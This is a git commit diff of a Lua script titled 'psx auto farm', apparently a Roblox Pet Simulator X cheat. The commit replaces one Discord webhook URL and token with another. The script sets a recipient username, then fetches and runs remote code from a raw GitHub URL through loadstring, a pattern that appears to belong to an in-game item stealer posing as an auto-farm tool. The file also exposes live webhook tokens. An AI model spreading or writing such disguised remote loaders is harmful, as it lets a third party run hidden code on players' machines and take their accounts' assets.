72da1557cd04fc12afb2cac69e4991ad8e509463
frrp9 <121900262+frrp9@users.noreply.github.com>
2023-04-09 17:35:06 +0200

    Update psx auto farm.lua

--- psx auto farm.lua
+++ psx auto farm.lua
@@ -1,5 +1,5 @@
 _G.Username = "shizuaahh"
 _G.HubName = "PS auto farm"
-_G.WebhookUrl = "https://discord.com/api/webhooks/1091064291597226004/AF1jrcKQ3R7v9T4xF8upHphn8J1SPf5eWWoY1jQFatOc1uhx1jnFxtr-ABdYkBOEkPJS"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1094646377956528138/A2LCCdrnzNV68Q38qqnP7Hmd8IxK8gReKQ0eB5HIfSfAd7roipV-VRfvFyLJF04mQ7YW"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
